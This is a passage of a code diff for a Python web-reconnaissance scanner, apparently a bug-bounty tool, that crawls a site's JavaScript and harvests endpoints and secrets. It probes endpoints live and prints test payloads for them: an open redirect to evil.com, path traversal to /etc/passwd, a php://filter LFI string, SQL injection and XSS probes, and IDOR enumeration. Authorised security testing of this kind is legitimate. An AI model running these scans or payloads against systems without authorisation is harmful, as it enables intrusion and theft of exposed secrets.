-    2. Probes each one live — returns real HTTP status codes
-    3. Assigns severity based on HTTP response, not just the word found
-    4. Shows parameters discovered for each endpoint
-    5. Generates test cases from ACTUAL patterns in the code
-    """
-    # ── collect everything from this specific target ──────────────────────
-    all_secrets      = []
-    all_constructors = []
-    all_src_maps     = []
-    all_endpoints    = {}   # endpoint -> {params, method, source_file, type}
-    all_technologies = set()
-    all_parameters   = []   # sensitive params found
-    library_files    = []
-    custom_files     = []
-    total_score      = 0
-
-    for res in all_analysis:
-        total_score += res.get("score", 0)
-        fname = res["url"].split("/")[-1].lower()
-
-        if res.get("library_file"):
-            library_files.append(fname)
-        else:
-            custom_files.append(res["url"])
-
-        all_secrets.extend(res.get("precision_secrets", []))
-        all_src_maps.extend(res.get("source_maps", []))
-        all_technologies.update(res.get("technologies", {}).keys())
-
-        # collect URL constructors from THIS file
-        for c in res.get("url_constructors", []):
-            ep = c["endpoint"].rstrip("*").rstrip("/")
-            if ep and ep not in all_endpoints:
-                all_endpoints[ep] = {
-                    "params":      [],
-                    "method":      "GET",
-                    "source_file": res["url"].split("/")[-1],
-                    "line":        c.get("line", 0),
-                    "context":     c.get("context", "")[:100],
-                    "type":        "constructor",
-                }
-
-        # collect parameters from THIS file
-        params_data = res.get("parameters", {})
-        if params_data:
-            for p in params_data.get("all", []):
-                ep = p.get("endpoint","").rstrip("/")
-                if ep and ep not in all_endpoints:
-                    all_endpoints[ep] = {
-                        "params":      p.get("params", []),
-                        "method":      p.get("method","GET"),
-                        "source_file": res["url"].split("/")[-1],
-                        "line":        0,
-                        "context":     p.get("context","")[:100],
-                        "type":        "extracted",
-                    }
-                elif ep in all_endpoints:
-                    all_endpoints[ep]["params"].extend(p.get("params", []))
-
-            for p in params_data.get("sensitive", []):
-                all_parameters.append(p)
-
-        # also pull endpoints from regular findings
-        for f in res.get("findings", []):
-            if f.get("category") == "Sensitive Endpoints & Paths":
-                match = f.get("match","").strip("\"'")
-                if match.startswith("/") and len(match) > 2:
-                    if match not in all_endpoints:
-                        all_endpoints[match] = {
-                            "params":      [],
-                            "method":      "GET",
-                            "source_file": res["url"].split("/")[-1],
-                            "line":        f.get("line", 0),
-                            "context":     f.get("context","")[:100],
-                            "type":        "pattern_match",
-                        }
-
-    w = term_width()
-    section_header(f"INTELLIGENCE REPORT: {domain}", LEMON)
-
-    # ── PRECISION SECRETS ────────────────────────────────────────────────
-    crit_secrets = [s for s in all_secrets if s["severity"] == "critical"]
-    high_secrets = [s for s in all_secrets if s["severity"] == "high"]
-
-    if all_secrets:
-        print(f"  {FG_CRITICAL if crit_secrets else FG_HIGH}{'─'*min(w-2,68)}")
-        print(f"  SECRETS FOUND IN JS  ({len(all_secrets)} total){RESET}\n")
-        for s in sorted(all_secrets, key=lambda x: SEVERITY_ORDER.get(x["severity"],9)):
-            badge = SEVERITY_BADGE.get(s["severity"],"")
-            print(f"  {badge} {s['severity'].upper():<8} {RESET}  "
-                  f"{FG_CRITICAL}{s['service']:<28}{RESET}  "
-                  f"{FG_URL}L{s['line']:4d}  {s['source_file'].split('/')[-1][:25]}{RESET}")
-            print(f"    {FG_HIGH}{s['match'][:w-8]}{RESET}")
-            if s.get("context") and s["context"].strip() != s["match"].strip():
-                print(f"    {FG_DIM}ctx: {s['context'][:w-10]}{RESET}")
-            print()
-
-    # ── LIVE ENDPOINT PROBE ───────────────────────────────────────────────
-    # Only probe endpoints actually found in THIS target's JS
-    if all_endpoints:
-        print(f"  {FG_SECTION}{'─'*min(w-2,68)}")
-        print(f"  ENDPOINTS FOUND IN JS — LIVE STATUS CHECK")
-        print(f"  {FG_DIM}Probing {min(len(all_endpoints),25)} endpoint(s) extracted from {domain}'s JS files{RESET}\n")
-
-        # header row
-        print(f"  {FG_DIM}{'STATUS':<8} {'TIME':>5}  {'ENDPOINT':<40} {'PARAMS':<20} SOURCE{RESET}")
-        print(f"  {FG_DIM}{'─'*8} {'─'*5}  {'─'*40} {'─'*20} {'─'*15}{RESET}")
-
-        probed_results = []
-        ep_list = list(all_endpoints.items())[:25]
-
-        with ThreadPoolExecutor(max_workers=5) as executor:
-            future_map = {}
-            for ep, meta in ep_list:
-                full_url = f"https://{domain}{ep}" if ep.startswith("/") else ep
-                future_map[executor.submit(probe_endpoint_live, full_url, session)] = (ep, meta, full_url)
-
-            for future in as_completed(future_map):
-                ep, meta, full_url = future_map[future]
-                try:
-                    status, size, redir, ms = future.result()
-                except Exception:
-                    status, size, redir, ms = 0, 0, "", 0
-
-                # severity based on ACTUAL HTTP response — not just the word
-                if status == 200:
-                    sev   = "medium"   # exists and responds — worth manual check
-                    color = FG_SUCCESS
-                    icon  = "●"
-                elif status in [301, 302, 303, 307, 308]:
-                    sev   = "info"
-                    color = FG_MEDIUM
-                    icon  = "→"
-                elif status == 401:
-                    sev   = "low"      # exists, requires auth — interesting
-                    color = FG_LOW
-                    icon  = "🔒"
-                elif status == 403:
-                    sev   = "low"      # exists, forbidden — worth noting
-                    color = FG_LOW
-                    icon  = "🔒"
-                elif status in [404, 0]:
-                    sev   = "info"
-                    color = FG_DIM
-                    icon  = "✗"
-                elif status == 500:
-                    sev   = "medium"   # server error on probe = potentially interesting
-                    color = FG_HIGH
-                    icon  = "💥"
-                else:
-                    sev   = "info"
-                    color = FG_DIM
-                    icon  = "?"
-
-                params_str = ",".join(meta["params"][:4]) if meta["params"] else "-"
-                ep_display = ep[:38] + ".." if len(ep) > 40 else ep
-                src_display = meta["source_file"][:14]
-                ms_str     = f"{ms}ms" if ms > 0 else "n/a"
-
-                status_str  = str(status) if status > 0 else "err"
-                status_color = (FG_SUCCESS if status==200
-                                else FG_MEDIUM if status in [301,302,307,308]
-                                else FG_LOW if status in [401,403]
-                                else FG_HIGH if status==500
-                                else FG_DIM)
-
-                print(f"  {status_color}{icon} {status_str:<6}{RESET} "
-                      f"{FG_DIM}{ms_str:>5}{RESET}  "
-                      f"{color}{ep_display:<40}{RESET} "
-                      f"{FG_DIM}{params_str:<20}{RESET} "
-                      f"{FG_DIM}{src_display}{RESET}")
-
-                if redir:
-                    print(f"  {FG_DIM}         → {redir[:w-12]}{RESET}")
-
-                probed_results.append({
-                    "endpoint": ep,
-                    "full_url": full_url,
-                    "status":   status,
-                    "size":     size,
-                    "params":   meta["params"],
-                    "method":   meta["method"],
-                    "source":   meta["source_file"],
-                    "severity": sev,
-                    "ms":       ms,
-                })
-
-        print()
-
-        # ── INTERESTING ENDPOINTS (200/401/403/500 only) ──────────────────
-        interesting = [r for r in probed_results if r["status"] in [200,401,403,500]]
-        if interesting:
-            print(f"  {FG_SECTION}{'─'*min(w-2,68)}")
-            print(f"  ENDPOINTS WORTH MANUAL TESTING  ({len(interesting)} responded)\n")
-
-            for r in sorted(interesting, key=lambda x: (0 if x["status"]==200 else 1 if x["status"]==500 else 2)):
-                badge = SEVERITY_BADGE.get(r["severity"],"")
-                scolor = FG_SUCCESS if r["status"]==200 else FG_HIGH if r["status"]==500 else FG_LOW
-
-                print(f"  {badge} HTTP {r['status']} {RESET}  {scolor}{r['full_url'][:w-20]}{RESET}")
-                if r["params"]:
-                    print(f"    {FG_DIM}Parameters: {', '.join(r['params'][:8])}{RESET}")
-                    print(f"    {FG_DIM}Method    : {r['method']}{RESET}")
-
-                # generate specific test cases for THIS endpoint based on its params
-                if r["params"]:
-                    idor_params    = [p for p in r["params"] if p.lower() in
-                                      {"id","user_id","uid","account_id","device_id","item_id","order_id","doc_id"}]
-                    redirect_params = [p for p in r["params"] if p.lower() in
-                                       {"redirect","return_url","next","url","callback","goto"}]
-                    file_params    = [p for p in r["params"] if p.lower() in
-                                      {"file","path","filename","template","page","include","load"}]
-                    inject_params  = [p for p in r["params"] if p.lower() in
-                                      {"search","query","q","filter","where","sort","order","cmd"}]
-
-                    if idor_params:
-                        for p in idor_params[:2]:
-                            print(f"    {FG_MEDIUM}→ IDOR test: {r['full_url']}?{p}=1  vs  {r['full_url']}?{p}=2{RESET}")
-                            print(f"      {FG_MEDIUM}→ Try: {r['full_url']}?{p}=1 | {r['full_url']}?{p}=99999{RESET}")
-
-                    if redirect_params:
-                        for p in redirect_params[:1]:
-                            print(f"    {FG_MEDIUM}→ Open redirect: {r['full_url']}?{p}=https://evil.com{RESET}")
-
-                    if file_params:
-                        for p in file_params[:1]:
-                            print(f"    {FG_MEDIUM}→ Path traversal: {r['full_url']}?{p}=../../../etc/passwd{RESET}")
-
-                    if inject_params:
-                        for p in inject_params[:1]:
-                            print(f"    {FG_MEDIUM}→ SQLi test: {r['full_url']}?{p}=test'{RESET}")
-                            print(f"    {FG_MEDIUM}→ XSS test : {r['full_url']}?{p}=%22%3E%3Cscript%3Ealert(1)%3C/script%3E{RESET}")
-
-                elif r["status"] == 200:
-                    print(f"    {FG_DIM}→ Try: add ?id=1, ?user_id=1, ?debug=true to test for IDOR/info disclosure{RESET}")
-
-                print()
-
-    # ── SENSITIVE PARAMETERS ─────────────────────────────────────────────
-    if all_parameters:
-        print(f"  {FG_MEDIUM}{'─'*min(w-2,68)}")
-        print(f"  SECURITY-SENSITIVE PARAMETERS FOUND IN JS  ({len(all_parameters)})\n")
-        for p in all_parameters[:15]:
-            ep     = p.get("endpoint","?")
-            sparams = p.get("sensitive_params",[])
-            method = p.get("method","GET")
-            print(f"  {FG_MEDIUM}  {method:<5} {ep[:45]}{RESET}")
-            print(f"    {FG_DIM}Sensitive params: {', '.join(sparams[:6])}{RESET}")
-            full_url = f"https://{domain}{ep}" if ep.startswith("/") else ep
-            for sp in sparams[:3]:
-                print(f"    {FG_LOW}→ Test: {full_url}?{sp}=1{RESET}")
-            print()
-
-    # ── SOURCE MAPS ──────────────────────────────────────────────────────
-    if all_src_maps:
-        print(f"  {FG_MEDIUM}{'─'*min(w-2,68)}")
-        print(f"  SOURCE MAPS REFERENCED IN JS  ({len(all_src_maps)})\n")
-        print(f"  {FG_DIM}If accessible → full unminified source code exposed (reportable){RESET}\n")
-        for sm in all_src_maps[:8]:
-            status, size, _, ms = probe_endpoint_live(sm, session, timeout=6)
-            color  = FG_CRITICAL if status==200 else FG_DIM
-            badge  = SEVERITY_BADGE.get("medium" if status==200 else "info","")
-            ms_str = f"{ms}ms" if ms > 0 else ""
-            print(f"  {badge} {status if status>0 else 'err':<4} {RESET}  {color}{sm[:w-20]}{RESET}  {FG_DIM}{ms_str}{RESET}")
-            if status == 200:
-                print(f"    {FG_HIGH}→ ACCESSIBLE — Report as: Information Disclosure via Source Map{RESET}")
-        print()
-
-    # ── TECH STACK ───────────────────────────────────────────────────────
-    if all_technologies:
-        print(f"  {FG_DIM}{'─'*min(w-2,68)}")
-        print(f"  TECHNOLOGY STACK: {', '.join(sorted(all_technologies))}{RESET}\n")
-
-    # ── OVERALL SCORE ────────────────────────────────────────────────────
-    print(f"  {FG_DIM}{'─'*min(w-2,68)}")
-    score_color = FG_CRITICAL if total_score>=300 else FG_HIGH if total_score>=100 else FG_MEDIUM if total_score>=30 else FG_DIM
-    print(f"  {FG_DIM}Total risk score :{RESET} {score_color}{total_score}{RESET}")
-    print(f"  {FG_DIM}Custom app files :{RESET} {FG_URL}{len(custom_files)}{RESET}")
-    print(f"  {FG_DIM}Library files    :{RESET} {FG_DIM}{len(library_files)} (safe third-party code){RESET}")
     print()
 
-    return {
-        "all_secrets":      all_secrets,
-        "all_endpoints":    all_endpoints,
-        "all_src_maps":     all_src_maps,
-        "all_technologies": list(all_technologies),
-        "total_score":      total_score,
-    }
+    # generate test cases for interesting endpoints
+    interesting = [r for r in probed if r["status"] in [200, 401, 403, 500]]
+    if interesting:
+        print(f"  {YELLOW}{'─'*min(w-2,68)}")
+        print(f"  ENDPOINTS WORTH TESTING  ({len(interesting)} responded){RESET}\n")
+
+        IDOR_PARAMS    = {"id","user_id","uid","account_id","device_id","item_id","order_id","record_id","doc_id"}
+        REDIRECT_PARAMS = {"redirect","return_url","next","url","callback","goto","return","destination"}
+        FILE_PARAMS    = {"file","path","filename","template","page","include","load","dir","folder"}
+        INJECT_PARAMS  = {"search","query","q","filter","where","sort","order","cmd","command","input","keyword"}
+
+        for r in interesting:
+            sc = GREEN if r["status"]==200 else YELLOW if r["status"] in [401,403] else RED
+            print(f"  {sc}▸ HTTP {r['status']}  {r['full_url'][:w-20]}{RESET}")
+
+            if r["params"]:
+                print(f"    {DIM}Parameters: {', '.join(r['params'][:8])}{RESET}")
+                base = r["full_url"]
+
+                for p in r["params"]:
+                    pl = p.lower()
+                    if pl in IDOR_PARAMS:
+                        print(f"    {YELLOW}→ IDOR: {base}?{p}=1  then try ?{p}=2, ?{p}=100, ?{p}=9999{RESET}")
+                    if pl in REDIRECT_PARAMS:
+                        print(f"    {YELLOW}→ Open redirect: {base}?{p}=https://evil.com{RESET}")
+                    if pl in FILE_PARAMS:
+                        print(f"    {YELLOW}→ Path traversal: {base}?{p}=../../../etc/passwd{RESET}")
+                        print(f"    {YELLOW}→ LFI: {base}?{p}=php://filter/convert.base64-encode/resource=index{RESET}")
+                    if pl in INJECT_PARAMS:
+                        print(f"    {YELLOW}→ SQLi: {base}?{p}=test'{RESET}")
+                        print(f"    {YELLOW}→ XSS:  {base}?{p}=%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E{RESET}")
+            else:
+                if r["status"] == 200:
+                    print(f"    {DIM}→ Try: {r['full_url']}?id=1 / ?debug=true / ?admin=true{RESET}")
+            print()
 
 
-def scan_target(url, args, session):
-    url    = normalize_url(url)
-    domain = get_domain(url)
+# ─────────────────────────────────────────────────────────────────────────────
+#  MAIN SCAN
+# ─────────────────────────────────────────────────────────────────────────────
 
-    section_header(f"TARGET: {url}", LEMON)
-    print(f"  {FG_DIM}Domain  :{RESET} {FG_URL}{domain}{RESET}")
-    print(f"  {FG_DIM}Time    :{RESET} {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
-    print(f"  {FG_DIM}Platform:{RESET} {get_platform_info()}\n")
+def scan(target_url, args, session):
+    target_url = normalize(target_url)
+    domain     = domain_of(target_url)
 
-    all_results = {
-        "target": url, "domain": domain,
-        "js_files": [], "other_files": [],
-        "analysis": [], "subdomains": [],
-        "sensitive_files": [], "correlations": [], "summary": {},
-    }
+    hdr(f"TARGET: {domain}", WHITE)
+    print(f"  {DIM}URL     : {target_url}")
+    print(f"  {DIM}Time    : {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+    print(f"  {DIM}Platform: {get_platform()}{RESET}\n")
 
-    # ── 1. discover JS ────────────────────────────────────────────────────
-    info(f"Crawling {url} for JS and interesting files...")
-    js_files, other_files, base_resp = extract_js_from_page(url, session, waf_aware=args.waf_aware)
+    # ── Step 1: crawl for JS files ─────────────────────────────────────────
+    info(f"Crawling {target_url} for JS files...")
 
-    all_results["js_files"]    = list(js_files)
-    all_results["other_files"] = list(other_files)
-    success(f"Found {len(js_files)} JS file(s)  |  {len(other_files)} other file(s)")
-
-    if js_files:
-        print(f"\n  {FG_SECTION}JavaScript Files:{RESET}")
-        for jf in sorted(js_files):
-            print(f"    {FG_URL}  ↳ {jf[:term_width()-10]}{RESET}")
-
-    if other_files and not args.js_only:
-        print(f"\n  {FG_MEDIUM}Other Files:{RESET}")
-        for f in sorted(other_files):
-            print(f"    {FG_MEDIUM}  ↳ {f[:term_width()-10]}{RESET}")
-
-    # ── 2. deep crawl ────────────────────────────────────────────────────
-    if args.deep:
-        info("Deep mode: following JS import chains...")
-        extra_js = set()
-        for jf in list(js_files)[:10]:
-            sub_js, _, _ = extract_js_from_page(jf, session, waf_aware=args.waf_aware)
-            extra_js |= sub_js
-        new_js = extra_js - js_files
-        if new_js:
-            success(f"Deep crawl found {len(new_js)} more JS file(s)")
-            js_files |= new_js
-            all_results["js_files"] = list(js_files)
-
-    # ── 3. analyze JS ────────────────────────────────────────────────────
-    if args.analyze and js_files:
-        section_header(f"ANALYZING {len(js_files)} JS FILE(S)  [{domain}]", FG_SECTION)
-
-        def analyze_one(js_url):
-            if args.waf_aware:
-                random_delay(waf_mode=True)
-            js_url, resp = try_http_fallback(js_url, session)
-            if not resp or not resp.text:
-                return None
-            content = resp.text
-            if args.dump:
-                safe_name = re.sub(r'[^\w\-_.]', '_', js_url)[:80]
-                dump_dir  = args.dump_dir or "jsreaper_dumps"
-                dump_path = os.path.join(dump_dir, safe_name + ".js")
-                os.makedirs(dump_dir, exist_ok=True)
-                with open(dump_path, "w", encoding="utf-8", errors="ignore") as df:
-                    df.write(f"// Source: {js_url}\n// Domain: {domain}\n\n")
-                    df.write(content)
-            return analyze_js_content(js_url, content, beautify=args.beautify, source_domain=domain)
-
-        with ThreadPoolExecutor(max_workers=args.threads) as executor:
-            futures = {executor.submit(analyze_one, jf): jf for jf in list(js_files)}
-            for future in as_completed(futures):
-                res = future.result()
-                if res:
-                    all_results["analysis"].append(res)
-                    if res["findings"] or (args.verbose and res["endpoints"]):
-                        print_analysis(res, show_endpoints=args.endpoints)
-
-        # run cross-file correlation
-        if len(all_results["analysis"]) > 1:
-            correlations = correlate_findings(all_results["analysis"])
-            all_results["correlations"] = correlations
-            if correlations:
-                print_correlations(correlations)
-
-        # run intelligence report — DeepSeek-style actionable output
-        intel_test_cases = print_intelligence_report(
-            domain, all_results["analysis"], session, args
-        )
-        all_results["intelligence_test_cases"] = intel_test_cases or []
-
-        # ── EXECUTIVE SUMMARY — DeepSeek-style reasoning ────────────────
-        # This gives the overall verdict, per-file reasoning, and
-        # proactive recon steps not in the JS but logically implied.
-        exec_summary = generate_executive_summary(
-            domain, all_results["analysis"], url, session
-        )
-        all_results["exec_summary"] = exec_summary
-
-        # save intelligence report to output file if requested
-        if args.output and intel_test_cases:
-            report_txt = generate_bounty_report(
-                domain,
-                url,
-                intel_test_cases,
-                [s for r in all_results["analysis"] for s in r.get("precision_secrets", [])],
-                [c for r in all_results["analysis"] for c in r.get("url_constructors", [])],
-            )
-            if report_txt:
-                report_path = args.output.replace(".txt","").replace(".json","") + "_intel_report.txt"
-                try:
-                    with open(report_path, "w", encoding="utf-8") as rf:
-                        rf.write(report_txt)
-                    success(f"Intelligence report saved → {report_path}")
-                except Exception:
-                    pass
-
-    # ── 4. sensitive file probe ───────────────────────────────────────────
-    if args.probe:
-        found_files = probe_sensitive_files(url, session, threads=args.threads, waf_aware=args.waf_aware)
-        all_results["sensitive_files"] = found_files
-
-    # ── 5. subdomain recon ────────────────────────────────────────────────
-    if args.subdomains:
-        subs = run_subdomain_recon(domain)
-        all_results["subdomains"] = list(subs)
-        if args.scan_subs and subs:
-            info(f"Scanning {min(len(subs),10)} subdomains for JS...")
-            for sub in list(subs)[:10]:
-                sub_url = f"https://{sub}"
-                sub_js, _, _ = extract_js_from_page(sub_url, session, waf_aware=args.waf_aware)
-                if sub_js:
-                    success(f"  {sub}: {len(sub_js)} JS file(s)")
-                    all_results["js_files"].extend(list(sub_js))
-
-    # ── summary ───────────────────────────────────────────────────────────
-    total_findings = sum(len(r["findings"]) for r in all_results["analysis"])
-    critical  = sum(1 for r in all_results["analysis"] for f in r["findings"] if f["severity"]=="critical")
-    high      = sum(1 for r in all_results["analysis"] for f in r["findings"] if f["severity"]=="high")
-    medium    = sum(1 for r in all_results["analysis"] for f in r["findings"] if f["severity"]=="medium")
-    total_score = sum(r["score"] for r in all_results["analysis"])
-
-    all_results["summary"] = {
-        "js_files_found":        len(js_files),
-        "other_files_found":     len(other_files),
-        "total_findings":        total_findings,
-        "critical":              critical,
-        "high":                  high,
-        "medium":                medium,
-        "risk_score":            total_score,
-        "subdomains_found":      len(all_results["subdomains"]),
-        "sensitive_files_found": len(all_results["sensitive_files"]),
-        "correlations_found":    len(all_results["correlations"]),
-    }
-
-    print_summary(all_results["summary"], url)
-    return all_results
-
-# ═════════════════════════════════════════════════════════════════════════════
-#  SUMMARY
-# ═════════════════════════════════════════════════════════════════════════════
-
-def print_summary(s, target):
-    section_header(f"SUMMARY: {target}", LEMON)
-    score_color = (FG_CRITICAL if s["risk_score"]>=200 else FG_HIGH if s["risk_score"]>=80
-                   else FG_MEDIUM if s["risk_score"]>=20 else FG_SUCCESS)
-    rows = [
-        ("JS Files Found",       f"{FG_URL}{s['js_files_found']}{RESET}"),
-        ("Other Files Found",    f"{FG_MEDIUM}{s['other_files_found']}{RESET}"),
-        ("Total Findings",       f"{FG_HIGH}{s['total_findings']}{RESET}"),
-        ("Critical",             f"{SEVERITY_BADGE['critical']} {s['critical']} {RESET}"),
-        ("High",                 f"{SEVERITY_BADGE['high']} {s['high']} {RESET}"),
-        ("Medium",               f"{SEVERITY_BADGE['medium']} {s['medium']} {RESET}"),
-        ("Correlations Found",   f"{FG_CORR}{s['correlations_found']}{RESET}"),
-        ("Subdomains Found",     f"{FG_SUB}{s['subdomains_found']}{RESET}"),
-        ("Sensitive Files Hit",  f"{FG_PROBE}{s['sensitive_files_found']}{RESET}"),
-        ("Total Risk Score",     f"{score_color}{s['risk_score']}{RESET}"),
-    ]
-    for label, value in rows:
-        print(f"  {FG_DIM}{label:<24}{RESET}  {value}")
-
-    score = s["risk_score"]
-    if score >= 300:
-        verdict = f"{SEVERITY_BADGE['critical']} 🔥 CRITICAL — Immediate review required {RESET}"
-    elif score >= 100:
-        verdict = f"{SEVERITY_BADGE['high']} ⚠  HIGH RISK — Review findings carefully {RESET}"
-    elif score >= 30:
-        verdict = f"{SEVERITY_BADGE['medium']} ⚡ MEDIUM RISK — Some issues found {RESET}"
-    elif score > 0:
-        verdict = f"{SEVERITY_BADGE['low']} ℹ  LOW RISK — Minor findings {RESET}"
+    if args.burp_paste:
+        from jsreaper import parse_burp_js_input
+        js_files = set(parse_burp_js_input(args.burp_paste))
+        info(f"Using {len(js_files)} JS URLs from --burp-paste")
+    elif args.burp:
+        js_files = set(parse_burp_file(args.burp))
+        info(f"Using {len(js_files)} JS URLs from Burp file")
     else:
-        verdict = f"{FG_SUCCESS}  ✓ CLEAN {RESET}"
-    print(f"\n  Overall: {verdict}\n")
+        js_files, _ = crawl_js_files(target_url, session)
 
-# ═════════════════════════════════════════════════════════════════════════════
-#  OUTPUT SAVER
-# ═════════════════════════════════════════════════════════════════════════════
+    if not js_files:
+        warn("No JS files found on this target.")
+        return {}
 
-def save_output(all_scan_results, output_file, fmt="txt"):
-    output_file = os.path.normpath(output_file)
+    ok(f"Found {len(js_files)} JS file(s)")
+    for jf in sorted(js_files):
+        print(f"  {CYAN}  ↳ {jf[:W()-10]}{RESET}")
+    print()
+
+    # ── Step 2: analyse each JS file ──────────────────────────────────────
+    hdr(f"ANALYSING {len(js_files)} JS FILE(S)", WHITE)
+
+    all_findings  = []
+    all_endpoints = {}
+    lib_count     = 0
+    app_count     = 0
+
+    def analyse_one(js_url):
+        js_url, resp = fetch_with_fallback(js_url, session)
+        if not resp or not resp.text:
+            return None
+
+        content = resp.text
+
+        # beautify if requested
+        if args.beautify and HAS_BEAUTIFIER:
+            try:
+                content = jsbeautifier.beautify(content)
+            except Exception:
+                pass
+
+        # dump to disk if requested
+        if args.dump:
+            safe = re.sub(r'[^\w\-_.]', '_', js_url)[:80]
+            os.makedirs(args.dump_dir, exist_ok=True)
+            with open(os.path.join(args.dump_dir, safe+".js"), "w",
+                      encoding="utf-8", errors="ignore") as df:
+                df.write(content)
+
+        lib, lib_reason = is_library(js_url, content[:2000])
+        size = len(content)
+
+        return {
+            "url":       js_url,
+            "content":   content,
+            "size":      size,
+            "is_lib":    lib,
+            "lib_reason":lib_reason,
+        }
+
+    results = []
+    with ThreadPoolExecutor(max_workers=args.threads) as ex:
+        futs = {ex.submit(analyse_one, jf): jf for jf in js_files}
+        for fut in as_completed(futs):
+            r = fut.result()
+            if r:
+                results.append(r)
+
+    for res in results:
+        fname = res["url"].split("/")[-1]
+        w     = W()
+
+        if res["is_lib"]:
+            lib_count += 1
+            print(f"  {DIM}⊘ {fname:<50} LIBRARY — {res['lib_reason']} (skipped){RESET}")
+            continue
+
+        app_count += 1
+        print(f"\n  {WHITE}▸ {fname}{RESET}  {DIM}({res['size']:,} bytes){RESET}")
+        sep()
+
+        content = res["content"]
+
+        # run all four analyses
+        ep_found  = extract_endpoints(content, res["url"])
+        sqli      = find_sqli_indicators(content, res["url"])
+        path_t    = find_path_traversal(content, res["url"])
+        rce       = find_rce_indicators(content, res["url"])
+        info_disc = find_info_disclosure(content, res["url"])
+
+        # accumulate findings
+        file_findings = sqli + path_t + rce + info_disc
+        for f in file_findings:
+            f["source_file"] = res["url"]
+            f["domain"]      = domain
+        all_findings.extend(file_findings)
+
+        # accumulate endpoints
+        for ep, meta in ep_found.items():
+            if ep not in all_endpoints:
+                all_endpoints[ep] = meta
+                all_endpoints[ep]["source_file"] = res["url"]
+
+        # print findings for this file
+        if file_findings:
+            print_findings(file_findings, res["url"], domain)
+        else:
+            print(f"  {DIM}  No SQL/path/RCE/disclosure findings in this file.{RESET}\n")
+
+        # show endpoints found
+        if ep_found:
+            print(f"  {CYAN}  {len(ep_found)} endpoint(s) extracted from this file:{RESET}")
+            for ep, meta in list(ep_found.items())[:20]:
+                params = f"  [{','.join(meta['params'][:4])}]" if meta["params"] else ""
+                print(f"    {CYAN}↳ {meta['method']:<5} {ep[:W()-20]}{DIM}{params}{RESET}")
+            print()
+
+    print(f"\n  {DIM}Libraries skipped: {lib_count}  |  App files analysed: {app_count}{RESET}\n")
+
+    # ── Step 3: probe endpoints live ──────────────────────────────────────
+    if all_endpoints and not args.no_probe:
+        info(f"Probing {min(len(all_endpoints),30)} endpoint(s) live...")
+        probed = []
+
+        def probe_one(ep, meta):
+            full = f"https://{domain}{ep}" if ep.startswith("/") else ep
+            status, size, redir, ms = probe_endpoint(full, session)
+            return {
+                "endpoint": ep,
+                "full_url": full,
+                "status":   status,
+                "size":     size,
+                "redirect": redir,
+                "ms":       ms,
+                "params":   meta["params"],
+                "method":   meta["method"],
+            }
+
+        ep_items = list(all_endpoints.items())[:30]
+        with ThreadPoolExecutor(max_workers=5) as ex:
+            futs = {ex.submit(probe_one, ep, meta): ep for ep, meta in ep_items}
+            for fut in as_completed(futs):
+                probed.append(fut.result())
+
+        print_endpoints_table(probed, domain)
+
+    # ── Step 4: summary ───────────────────────────────────────────────────
+    hdr(f"SUMMARY: {domain}", WHITE)
+
+    crit  = [f for f in all_findings if f["severity"]=="critical"]
+    high  = [f for f in all_findings if f["severity"]=="high"]
+    med   = [f for f in all_findings if f["severity"]=="medium"]
+
+    print(f"  {DIM}JS files found    :{RESET} {len(js_files)}")
+    print(f"  {DIM}App files analysed:{RESET} {app_count}")
+    print(f"  {DIM}Libraries skipped :{RESET} {lib_count}")
+    print(f"  {DIM}Endpoints found   :{RESET} {len(all_endpoints)}")
+    print(f"  {DIM}Total findings    :{RESET} {len(all_findings)}")
+    print(f"  {SEV_BADGE['critical']} CRITICAL {RESET}: {len(crit)}")
+    print(f"  {SEV_BADGE['high']} HIGH     {RESET}: {len(high)}")
+    print(f"  {SEV_BADGE['medium']} MEDIUM   {RESET}: {len(med)}")
+    print()
+
+    if not all_findings:
+        print(f"  {GREEN}  No SQL/path/RCE/disclosure findings in the JS files analysed.{RESET}")
+        print(f"  {DIM}  This means the JS files do not contain these vulnerability patterns.")
+        print(f"  {DIM}  The endpoints found above are worth testing manually in Burp Suite.{RESET}")
+
+    # save output
+    if args.output:
+        save(all_findings, all_endpoints, domain, args.output, args.format)
+
+    return {
+        "domain":    domain,
+        "findings":  all_findings,
+        "endpoints": all_endpoints,
+    }
+
+
+def save(findings, endpoints, domain, path, fmt):
     try:
         if fmt == "json":
-            with open(output_file, "w", encoding="utf-8") as f:
-                json.dump(all_scan_results, f, indent=2, default=str)
+            data = {"domain": domain, "findings": findings,
+                    "endpoints": {k: v for k,v in endpoints.items()}}
+            with open(path, "w", encoding="utf-8") as f:
+                json.dump(data, f, indent=2, default=str)
         else:
-            with open(output_file, "w", encoding="utf-8") as f:
-                f.write(f"{TOOL_NAME} v{TOOL_VERSION} - Scan Report\n")
-                f.write(f"Written by @dr34lm — For research & educational use\n")
+            with open(path, "w", encoding="utf-8") as f:
+                f.write(f"JSReaper v{TOOL_VERSION} — @dr34lm\n")
+                f.write(f"Target: {domain}\n")
                 f.write(f"Generated: {datetime.datetime.now()}\n")
                 f.write("="*70+"\n\n")
-                for scan in all_scan_results:
-                    f.write(f"TARGET: {scan['target']}\nDOMAIN: {scan['domain']}\n\n")
-                    f.write(f"JS FILES ({len(scan['js_files'])}):\n")
-                    for jf in scan["js_files"]:
-                        f.write(f"  {jf}\n")
-                    f.write(f"\nCORRELATIONS ({len(scan['correlations'])}):\n")
-                    for c in scan["correlations"]:
-                        f.write(f"  [{c['severity'].upper()}] {c['type']} — {c['domain']}\n")
-                        f.write(f"  {c['description']}\n")
-                        for fn in c.get("files",[]):
-                            f.write(f"    file: {fn}\n")
-                    f.write(f"\nSENSITIVE FILES:\n")
-                    for sf in scan["sensitive_files"]:
-                        f.write(f"  [{sf['status']}] [{sf['domain']}] {sf['url']}\n")
-                    f.write(f"\nFINDINGS:\n")
-                    for res in scan["analysis"]:
-                        if not res["findings"]:
-                            continue
-                        f.write(f"\n  DOMAIN: {res['source_domain']}\n")
-                        f.write(f"  FILE  : {res['url']}\n")
-                        f.write(f"  SCORE : {res['score']}\n")
-                        for fnd in res["findings"]:
-                            f.write(f"  [{fnd['severity'].upper():<8}] {fnd['category']} "
-                                    f"| L{fnd['line']} | {fnd['match'][:100]}\n")
-                    f.write("\n"+"="*70+"\n\n")
-        success(f"Saved → {output_file}")
+                f.write(f"FINDINGS ({len(findings)}):\n\n")
+                for fi in sorted(findings, key=lambda x: SEV_ORDER.get(x["severity"],9)):
+                    f.write(f"[{fi['severity'].upper()}] {fi['type']}\n")
+                    f.write(f"  Description: {fi['description']}\n")
